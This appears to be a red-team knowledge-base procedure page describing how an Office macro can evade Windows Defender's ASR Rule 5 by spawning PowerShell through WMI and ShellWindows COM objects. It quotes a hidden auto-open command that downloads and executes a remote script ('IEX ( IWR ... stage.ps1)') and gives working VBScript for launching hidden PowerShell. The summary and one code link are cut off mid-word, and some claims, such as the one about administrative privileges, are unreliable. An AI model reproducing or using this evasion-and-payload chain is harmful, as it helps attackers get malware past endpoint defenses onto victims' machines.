---
id: 350c693a-0bde-4797-a7c5-fc0421e79757
name: ASR Bypass Create Child Process Rule 5 and Open PowerShell from Command Prompt
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:23.591367+00:00'
updated_at: '2023-04-10T20:36:53.417749+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[PowerShell|T1086 - PowerShell]]'
- '[[Scripting|T1064 - Scripting]]'
- '[[Software Packing|T1045 - Software Packing]]'
tags:
- '[[DOCM - WMI COM functions]]'
- '[[Office - Attacks]]'
commands:
- '[[Open PowerShell]]'
---

# ASR Bypass Create Child Process Rule 5 and Open PowerShell from Command Prompt

## Summary

ASR Bypass Create Child Process Rule 5 and Open PowerShell from Command Prompt is a technique used to bypass Windows Defender Attack Surface Reduction (ASR) rules and execute PowerShell from the command prompt. This technique involves using WMI COM functions to create a child process which then exe

## Description

# Description

ASR Bypass Create Child Process Rule 5 and Open PowerShell from Command Prompt is a technique used to bypass Windows Defender Attack Surface Reduction (ASR) rules and execute PowerShell from the command prompt. This technique involves using WMI COM functions to create a child process which then executes PowerShell, thereby bypassing ASR Rule 5 which blocks PowerShell processes executed from the command prompt. This technique can be used by attackers to execute malicious code on a target system without being detected by Windows Defender.

Technical Explanation: ASR Bypass Create Child Process Rule 5 and Open PowerShell from Command Prompt uses the WMI COM function to create a child process which executes PowerShell. This technique bypasses ASR Rule 5 which blocks PowerShell processes executed from the command prompt. Once PowerShell is executed, attackers can use it to execute malicious code on the target system.

Business Value: This technique can be used by attackers to execute malicious code on a target system without being detected by Windows Defender. By bypassing ASR Rule 5, attackers can execute PowerShell from the command prompt and use it to perform various malicious activities such as downloading and executing additional malware, stealing sensitive data, or performing reconnaissance on the target system.

## Requirements

1. Access to the target system

1. WMI COM functions enabled on the target system

## Defense

1. Enable ASR Rule 5 to block PowerShell processes executed from the command prompt

1. Use endpoint protection software to detect and block malicious activities

1. Monitor the system for suspicious activity and investigate any anomalies

## Objectives

1. Bypass Windows Defender ASR Rule 5

1. Execute PowerShell from the command prompt

1. Execute malicious code on the target system

# Instructions

1. This command creates a child process to bypass ASR (Attack Surface Reduction) rules. It uses PowerShell to download and execute a payload from a remote server.

**Code**: [[Sub ASR_bypass_create_child_process_rule5()
    Co]]

> The 'ASR_bypass_create_child_process_rule5' function creates a new process using the 'Win32_Process' class in WMI. It sets the 'ShowWindow' property to 0 to hide the window of the new process. It then executes the command 'cmd.exe /c powershell.exe IEX ( IWR -uri 'http://10.10.10.10/stage.ps1')' which downloads and executes a PowerShell script from the specified URL. This is achieved by using the 'Create' method of the 'Win32_Process' class. The 'AutoExec' and 'AutoOpen' subroutines are called to execute the 'ASR_bypass_create_child_process_rule5' function automatically when the document is opened or when a macro is executed.

2. To open PowerShell from Command Prompt, follow the steps below:
1. Open Command Prompt
2. Type the command: powershell
3. Press Enter

**Code**: [[Const ShellWindows = "{9BA05972-F6A8-11CF-A442-00A]]

> This script automates the above steps by using the Windows Script Host object model to open a new instance of the Windows Shell, and then execute the PowerShell command from there. The script launches the Command Prompt and then executes the PowerShell command, which opens a new PowerShell console window. The command is executed with administrative privileges, which allows the user to perform administrative tasks.

**Command** ([[Open PowerShell]]):

```powershell
Const ShellWindows = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
Set SW = GetObject("new:" & ShellWindows).Item()
SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe", "C:\Windows\System32", Null, 0
```

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[PowerShell|T1086 - PowerShell]]
- [[Scripting|T1064 - Scripting]]
- [[Software Packing|T1045 - Software Packing]]

## Commands Used

- [[Open PowerShell]]

## Tags

- [[DOCM - WMI COM functions]]
- [[Office - Attacks]]
